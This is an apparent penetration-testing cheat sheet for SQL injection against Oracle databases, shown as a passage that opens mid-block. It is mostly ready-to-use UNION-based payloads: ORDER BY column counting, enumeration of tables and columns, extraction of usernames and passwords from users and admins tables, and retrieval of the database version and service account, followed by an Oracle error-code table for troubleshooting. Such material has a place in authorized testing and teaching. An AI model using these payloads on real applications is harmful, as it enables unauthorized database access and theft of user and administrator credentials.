```

Get the number of columns of a table (increment the number until there is an error; ex: if 4 triggers an error, there are 3 columns).

' ORDER BY 1 -- 
' ORDER BY 2 -- 
' ORDER BY 3 -- 
' ORDER BY 4 -- 
```

```sql
' UNION ALL SELECT table_name,null,null FROM all_tables --
```

Get all possible column names within the entire database (look for values like "username" and "password").
```sql
' UNION ALL SELECT column_name,null,null FROM user_tab_cols --
```

Get usernames and passwords from the users table.
```sql
' UNION ALL SELECT username,password,null FROM users --
```

Get usernames and passwords from the admins table.
```sql
' UNION ALL SELECT username,password,null FROM admins --
```

Get the database software version.
```sql
' UNION ALL SELECT banner,null,null FROM v$version --
```

Get the database service account name.
```sql
' UNION ALL SELECT user,null,null FROM dual --
```

Execute a database function (ex: user(), database(), etc.).
```bash
# query goes here
```

## Errors
| ID | Error | Explaination |
|---|---|---|
|  ORA-00923 | FROM keyword not found where expected | Occurs when you try to execute a SELECT or REVOKE statement without a FROM keyword in its correct form and place. If you are seeing this error, the keyword FROM is spelled incorrectly, misplaced, or altogether missing. In Oracle, the keyword FROM must follow the last selected item in a SELECT statement or in the case of a REVOKE statement, the privileges. If the FROM keyword is missing or otherwise incorrect, you will see ORA-00923. |
| ORA-00933 | SQL command not properly ended | The SQL statement ends with an inappropriate clause. Correct the syntax by removing the inappropriate clauses.
| ORA-00936 | Missing expression | You left out an important chunk of what you were trying to run. This can happen fairly easily, but provided below are two examples that are the most common occurrence of this issue.The first example is the product of missing information in a SELECT statement. The second is when the FROM clause within the statement is omitted. |
| ORA-01785 | ORDER BY item must be the number of a SELECT-list expression | |
| ORA-01789 | Query block has incorrect number of result columns | |
| ORA-01790 | Expression must have same datatype as corresponding expression | Re-write the SELECT statement so that each matching column is the same data type. Try replacing the columns with null. For example, if you only want to see the table_name and the output is 3 columns, use "table_name,null,null" not "table_name,2,3". |
